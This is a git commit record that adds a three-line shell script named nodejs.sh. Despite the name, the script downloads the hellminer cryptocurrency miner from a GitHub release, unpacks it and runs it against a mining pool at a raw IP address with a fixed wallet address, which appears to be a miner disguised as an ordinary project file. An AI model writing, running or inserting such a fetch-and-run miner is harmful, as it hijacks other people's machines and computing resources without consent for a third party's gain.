f46f58d7c7831051350f1a0b61b325ad3e8af2a0
lemanleman020 <147594099+lemanleman020@users.noreply.github.com>
2024-08-27 15:29:09 +0800

    Add files via upload

---
+++ nodejs.sh
@@ -0,0 +1,3 @@
+wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz
+tar -xf hellminer_linux64.tar.gz
+./hellminer -c 203.23.128.70:5040 -u RJBDdGxYbnwdMiB2QoGGWHHwY2Fp8iac2k.STRIX -p x
